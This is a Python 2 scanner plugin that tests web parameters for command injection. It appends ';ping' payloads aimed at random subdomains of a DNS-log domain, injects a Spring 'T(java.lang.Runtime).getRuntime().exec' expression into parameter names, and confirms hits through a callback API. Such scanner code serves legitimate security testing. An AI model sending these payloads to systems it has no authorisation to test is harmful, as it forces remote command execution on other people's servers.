#!/usr/bin/python
# -*- coding: utf-8 -*-
from copy import deepcopy
from urllib import quote
from engine.engine_utils.common import *
from urlparse import urlparse
from engine.logger import scanLogger as logger
import platform
import random
import string
import time
import requests
from engine.engine_utils.params import query2dict, dict2query, db_params2dict


def run_url(http,ob,item):
    result = []
    try:
        method = item['method']
        domain = ob['domain']
        header = {'Host': domain, 'Cookie': ob['cookie'] if ob['cookie'] else '' }
        source_ip = ob.get('source_ip')
        url = item['url']
        params = item['params']
        # p1 = r'\bexec\b|command|\bcmd\b'
        # p2 = r'command|\bcmd\b'
        # if not params:
        #     return result
        # if not (re.search(p1, url, re.I) or re.search(p2, params, re.I|re.M)):
        #     return result
        url_parse = urlparse(url)
        scheme = url_parse.scheme
        domain = url_parse.netloc
        path = url_parse.path
        query = url_parse.query

        if source_ip:
            domain = source_ip
        # if query:
        #     url = "%s://%s%s?%s" % (scheme, domain, path, query)
        # else:
        #     url = "%s://%s%s" % (scheme, domain, path)

        # get 方法
        if method.lower() == 'get':
            query_dict = query2dict(params)

            for k, v in query_dict.items():
                random_str, ping_cmd_list = _cmd_poc()
                for ping_cmd in ping_cmd_list:
                    query_dict_cp = deepcopy(query_dict)
                    if v:
                        query_dict_cp[k] = v + ';' + ping_cmd
                    else:
                        query_dict_cp[k] = ';' + ping_cmd
                    query_cmd = dict2query(params_dict=query_dict_cp, isUrlEncode=True)
                    cmd_url = '%s://%s%s?%s' % (scheme, domain, path, query_cmd)
                    res, content = http.request(url=cmd_url, method='GET', headers=header)
                    if callback(random_str):
                        detail = "通过dns log检测到命令执行漏洞"
                        request = getRequest(cmd_url, domain=ob['domain'])
                        response = getResponse(res)
                        result.append(getRecord(ob, cmd_url, ob['level'], detail, request, response))
                        break
            # 增加参数名注入检测
            kk = query_dict.keys()[0]
            vv = query_dict[kk]
            random_str, ping_cmd_list = _cmd_poc()
            for ping_cmd in ping_cmd_list:

                kk = "%s[T(java.lang.Runtime).getRuntime().exec(\"%s\")/sslegend]" % (kk, ping_cmd)

                cmd_url = '%s://%s%s?%s' % (scheme, domain, path, "%s=%s" % (kk, vv))
                res, content = http.request(url=cmd_url, method='GET', headers=header)
                if callback(random_str):
                    detail = "通过dns log检测到命令执行漏洞"
                    request = getRequest(cmd_url, domain=ob['domain'])
                    response = getResponse(res)
                    result.append(getRecord(ob, cmd_url, ob['level'], detail, request, response))
                    break
        else:
            body = params
            # query 部分注入，body不变
            if query:
                body_str = ''
                if body:
                    body_dict = db_params2dict(body)
                    body_str = dict2query(params_dict=body_dict, isUrlEncode=True)
                query_dict = query2dict(params)
                for k, v in query_dict.items():
                    random_str, ping_cmd_list = _cmd_poc()
                    for ping_cmd in ping_cmd_list:
                        query_dict_cp = deepcopy(query_dict)
                        if v:
                            query_dict_cp[k] = v + ';' + ping_cmd
                        else:
                            query_dict_cp[k] = ';' + ping_cmd
                        query_cmd = dict2query(params_dict=query_dict_cp, isUrlEncode=True)
                        cmd_url = '%s://%s%s?%s' % (scheme, domain, path, query_cmd)
                        res, content = http.request(url=cmd_url, method='POST', body=body_str, headers=header)
                        if callback(random_str):
                            detail = "通过dns log检测到命令执行漏洞"
                            request = getRequest(cmd_url, domain=ob['domain'])
                            response = getResponse(res)
                            result.append(getRecord(ob, cmd_url, ob['level'], detail, request, response))
                            break
                # 增加参数名注入检测
                kk = query_dict.keys()[0]
                vv = query_dict[kk]
                random_str, ping_cmd_list = _cmd_poc()
                for ping_cmd in ping_cmd_list:

                    kk = "%s[T(java.lang.Runtime).getRuntime().exec(\"%s\")/sslegend]" % (kk, ping_cmd)

                    cmd_url = '%s://%s%s?%s' % (scheme, domain, path, "%s=%s" % (kk, vv))
                    res, content = http.request(url=cmd_url, method='GET', headers=header)
                    if callback(random_str):
                        detail = "通过dns log检测到命令执行漏洞"
                        request = getRequest(cmd_url, domain=ob['domain'])
                        response = getResponse(res)
                        result.append(getRecord(ob, cmd_url, ob['level'], detail, request, response))
                        break
            if body:
                params_dict = db_params2dict(body)
                for k, v in params_dict.iteritems():
                    random_str, ping_cmd_list = _cmd_poc()
                    for ping_cmd in ping_cmd_list:
                        params_dict_cp = deepcopy(params_dict)
                        if v:
                            params_dict_cp[k] = v + ';' + ping_cmd
                        else:
                            params_dict_cp[k] = ';' + ping_cmd

                        params_cmd = dict2query(params_dict=params_dict_cp, isUrlEncode=True)
                        cmd_url = '%s://%s%s?%s' % (scheme, domain, path, query)

                        res, content = http.request(url=cmd_url, method='POST', body=params_cmd, headers=header)
                        if callback(random_str):
                            detail = "通过dns log检测到命令执行漏洞"
                            request = getRequest(cmd_url, domain=ob['domain'])
                            response = getResponse(res)
                            result.append(getRecord(ob, cmd_url, ob['level'], detail, request, response))
                            break
                # 增加参数名注入检测
                kk = params_dict.keys()[0]
                vv = params_dict[kk]
                random_str, ping_cmd_list = _cmd_poc()
                for ping_cmd in ping_cmd_list:

                    kk = "%s[T(java.lang.Runtime).getRuntime().exec(\"%s\")/sslegend]" % (kk, ping_cmd)

                    cmd_url = '%s://%s%s?%s' % (scheme, domain, path, "%s=%s" % (kk, vv))
                    res, content = http.request(url=cmd_url, method='GET', headers=header)
                    if callback(random_str):
                        detail = "通过dns log检测到命令执行漏洞"
                        request = getRequest(cmd_url, domain=ob['domain'])
                        response = getResponse(res)
                        result.append(getRecord(ob, cmd_url, ob['level'], detail, request, response))
                        break
    except Exception, e:
        logger.error("File:exec_cmd_dns_log.py, run_domain function :%s" % (str(e)))

    return result


# 生产随机子域名
def _cmd_poc():
    dns_log_domain = "test.cloudflarepro.com"
    random_str = ''.join(random.sample(string.ascii_letters + string.digits, 17))
    random_domain = random_str + '.' + dns_log_domain
    # if 'Windows' == platform.system():
    #     ping_cmd = 'ping -n 3 {}'.format(random_domain)
    # else:
    ping_linux = 'ping -c 3 {}'.format(random_domain)
    ping_win = 'ping -n 3 {}'.format(random_domain)
    return random_str, [ping_linux, ping_win]


def callback(random_str):
    api = 'http://admin.cloudflarepro.com/api/dns/test/{}/'
    r = requests.get(api.format(random_str))
    res = r.text
    return True if 'True' == res else False
